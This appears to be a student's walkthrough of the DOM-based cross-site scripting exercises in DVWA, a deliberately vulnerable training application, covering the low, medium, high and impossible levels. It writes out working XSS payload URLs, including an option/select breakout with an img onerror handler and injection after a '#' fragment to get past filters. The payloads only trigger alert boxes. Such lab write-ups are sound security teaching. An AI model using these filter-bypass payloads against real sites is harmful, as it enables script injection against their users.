# DVWA - DOM Based Cross Site Scripting


## Low level
> In this level, we can see the source code, it doesn't do any protection. So there has the XSS vulnerabilities.
> 
> ![](https://i.imgur.com/Ouzgh6E.png)

> Let use the following script command to attack.
> As we can see the URL, we cna know the URL structure. Therefore, we can input anything we want to input after the URL.
> 
> ![](https://i.imgur.com/KsQBmfX.png)

> Then we input the following script command after the URL.
```
http://192.168.1.66/DVWA-master/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(%27hack%27)%3C/script%3E
```
> ![](https://i.imgur.com/HxAFzeo.png)

## Medium level
> In this level we can know the web filter the `<script>`.
> 
> ![](https://i.imgur.com/rpEXrmw.png)

> So we need to use some way to bypass.
> Now we see the source code of the page.
> 
> ![](https://i.imgur.com/gRHlTnX.png)

> As we can see if we input the following URL.
```
http://192.168.1.66/DVWA-master/vulnerabilities/xss_d/?default=default=English</option></select><img src=1 onerror=alert(/xss/)>
```
> Then the page will be bypass the `<option>` and `<select>`. And we use the onerror feature of the `<img` we can attack the web.
```javascript
<option value=''> English</option></select><img src=1 onerror=alert(/xss/)></option>
```
![](https://i.imgur.com/B8qlrgM.png)

> Or we can use another way to attack.
> We can use "#" to bypass. Beacuse it will be look like command in js. So we can input the following URL to attack.
> 
```
http://192.168.1.66/DVWA-master/vulnerabilities/xss_d/?default=English#<script>alert('xss')</script>
```
## High level
> In this level we can check the source code to know. We just can use the text it list.
> 
> ![](https://i.imgur.com/EjSrBxT.png)

> So, we also use the same way to bypass. The text after "#" is looked comment.
> Using the following URL to attack the web.
```
http://192.168.1.66/DVWA-master/vulnerabilities/xss_d/?default=English#<script>alert('xss')</script>
```
![](https://i.imgur.com/QEmChZ2.png)


## Impossible level
> We can see the source code of the page, protction handled on the client side.
> The variable "lang" will encode the input, so it can't be attack.
> 
> ![](https://i.imgur.com/ep4lheF.png)

